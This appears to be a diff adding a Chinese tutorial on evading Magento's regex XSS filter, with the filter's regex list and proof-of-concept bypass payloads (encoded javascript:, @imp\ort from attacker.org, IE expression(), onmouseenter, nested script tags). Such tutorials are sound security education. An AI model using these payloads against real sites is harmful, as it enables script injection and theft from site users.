@@ -1,0 +1,101 @@
+XSS 攻击是一种攻击者将 JavaScript 代码注入到用户运行页面中的攻击。为了避免这种攻击，一些应用会尝试从用户输入中移除 JavaScript 代码，但这很难完全实现。在本文中会先展示一些尝试过滤 JavaScript 的代码，并随后给出其绕过方法。
+
+以一个网上商城应用 Magento 中的过滤类 Mage_Core_Model_Input_Filter_MaliciousCode 为例，部分代码如下：
+
+protected $_expressions = array(
+    '/(\/\*.*\*\/)/Us',
+    '/(\t)/',
+    '/(javascript\s*:)/Usi',
+    '/(@import)/Usi',
+    '/style=[^<]*((expression\s*?\([^<]*?\))|(behavior\s*:))[^<]*(?=\>)/Uis',
+    '/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^<]*(?=\>)/Uis',
+    '/<\/?(script|meta|link|frame|iframe).*>/Uis',
+    '/src=[^<]*base64[^<]*(?=\>)/Uis',
+);
+
+function filter($value) {
+    return preg_replace($this->_expressions, '', $value);
+}
+数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 <script>foo</script> 时，两个标签都会被移除而只剩下 foo。
+
+下面我们来看一下一些绕过的方法。我们的目标是利用一些 HTML 来执行 JavaScript，上述一些正则表达式是为了过滤如下：
+
+过滤的正则	可能的利用
+(javascript\s*:)	<a href="javascript:alert('xss')">
+@import	@import url(http://attacker.org/malicious.css)
+style=…	<div style="color: expression(alert('XSS'))">
+<script…	<script>alert("XSS")</script>
+ondblclick|onclick|…	
+Javascript URL
+
+链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：
+
+<a href="javascript:alert('test')">link</a>
+上面的过滤会从代码中移除 javascript:，所以我们不能直接这么写代码。但我们可以尝试改变 javascript:的写法，使它依旧可以被浏览器执行但又不匹配正则表达式。首先来尝试下 URL 编码：
+
+<a href="java&#115;cript:alert('xss')">link</a>
+上面这段代码不匹配正则表达式，但是浏览器依旧会执行它，因为浏览器会首先进行 URL 解码操作。
+
+另外，我们还可以使用 VBScript，虽然它在 IE11 中被禁用了，但依旧可以运行在旧版本的 IE 或者启用兼容模式的 IE11 上。我们可以使用类似上面 JavaScript 的方式来插入 VBScript 代码：
+
+<a href='vbscript:MsgBox("XSS")'>link</a>
+
+CSS import
+
+IE 浏览器支持在 CSS 中扩展 JavaScript，这种技术称为动态特性(dynamic properties)。允许攻击者加载一个外部 CSS 样式表是相当危险的，因为攻击者现在可以在原始页面中执行 JavaScript 代码了。
+
+<style>
+@import url("http://attacker.org/malicious.css");
+</style>
+malicious.css：
+
+body {
+    color: expression(alert('XSS'));
+}
+为了绕过对 @import 的过滤，可以在 CSS 中使用反斜杠进行绕过：
+
+<style>
+@imp\ort url("http://attacker.org/malicious.css");
+</style>
+IE 浏览器会接受反斜杠，但是我们绕过了过滤器。
+
+行内样式(Inline style)
+
+我们同样可以在行内样式里利用 IE 浏览器支持的动态特性：
+
+<div style="color: expression(alert('XSS'))">
+过滤器会检查关键字 style，随后跟随的不能是 <，在随后是 expression：
+
+/style=[^<]*((expression\s*?\([^<]*?\))|(behavior\s*:))[^<]*(?=\>)/Uis
+所以，让我们需要把 < 放到其他地方：
+
+<div style="color: '<'; color: expression(alert('XSS'))">
+这就绕过了过滤器，同时也是一个有效的 CSS。尽管 < 不是一个有效的颜色，但其他部分都是可以运行的。
+
+JavaScript 事件
+
+我们可以像如下这样在元素中定义 JavaScript 事件：
+
+<div onclick="alert('xss')">
+这个 JavaScript 代码当有人点击它后就会被执行，同时还有其他事件如页面加载或移动鼠标都可以触发这些事件。绝大部分的时间都被过滤器所移除了，但是依旧还有少量事件没有被过滤，例如，onmouseenter 事件：
+
+<div onmouseenter="alert('xss')">
+当用户鼠标移动到 div 上时就会触发我们的代码。
+
+另一个绕过的办法就是在属性和= 之间插入一个空格。Magento 在新版中依旧修复了这一问题。
+
+<div onclick ="alert('xss')">
+Script 标签
+
+Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
+
+<script>alert("XSS")</script>
+<script src="http://attacker.org/malicious.js"></script>
+而我们的过滤器移除了所有的 <script> 标签。然而，它只进行一次移除操作，所以我们希望在进行移除操作后保留下我们的目标代码：
+
+<scr<script>ipt>alert("XSS")</scr<script>ipt>
+过滤器会移除两个 <script> 标签，而余下的代码正是我们所希望得到的。事实上，这种嵌套的方法可以用来绕过所有基于正则表达式的过滤。
+
+总结
+
+尽管过滤器试图尽可能的阻止脚本注入，但我们还是发现了绕过它们的方法。要创建一个防止 XSS 攻击的过滤器是相当不容易的，需要同时考虑多类型的编码和一些不同浏览器的特性。这就使得它对开发人员来说非常困难，但是对攻击者来说却很容易。
